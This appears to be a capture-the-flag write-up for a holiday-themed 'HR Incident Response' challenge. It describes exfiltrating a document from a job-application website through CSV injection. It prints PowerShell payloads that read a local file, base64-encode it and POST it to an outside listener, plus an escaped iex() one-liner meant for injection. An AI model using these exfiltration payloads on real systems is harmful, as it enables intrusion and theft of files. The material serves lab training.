# 7. HR Incident Response
> Santa uses an Elf Resources website to look for talented information security professionals. Gain access to the website and fetch the document C:\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with "K." For hints on achieving this objective, please visit Sparkle Redberry and help her with the Dev Ops Fail Cranberry Pi terminal challenge.

1. Build a server to receive the POSTed file.
2. Test a payload to upload a file.
3. Use scripts/csv_injection Docker-compose project.
4. Start the node server: `docker-compose up nodeserver`
5. Use this payload to test:
```
echo "123123" > content.txt
$uri = "http://172.17.0.3:8084/"
$FileName="content.txt"

$Data = get-content $FileName
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Data)
$EncodedData = [Convert]::ToBase64String($Bytes)

$uri = $uri + "?data="+$EncodedData
Invoke-WebRequest -Uri $uri -Method POST
```

6. Node side, you should receive `MQAyADMAMQAyADMA`; and then
```bash
echo "MQAyADMAMQAyADMA" | base64 -d
123123 <<< You've exfiltrated a file!
```


7. Convert the payload to something that can be injected:

```
pwsh -c '$uri = \"http://172.17.0.3:8084/\"
$FileName=\"content.txt\"
$Data = get-content $FileName
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Data)
$EncodedData = [Convert]::ToBase64String($Bytes)
$uri = $uri + \"?data=\"+$EncodedData
Invoke-WebRequest -Uri $uri -Method POST'
```

All the above needs to be ran by the shell. Move the payload to a variable (with proper escaping) and then invoke iex() to execute it:

```
pwsh -c '$A=\'$uri = \"http://172.17.0.3:8084/\"
$FileName=\"content.txt\"
$Data = get-content $FileName
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Data)
$EncodedData = [Convert]::ToBase64String($Bytes)
$uri = $uri + \"?data=\"+$EncodedData
Invoke-WebRequest -Uri $uri -Method POST
iex($A)'\'
```
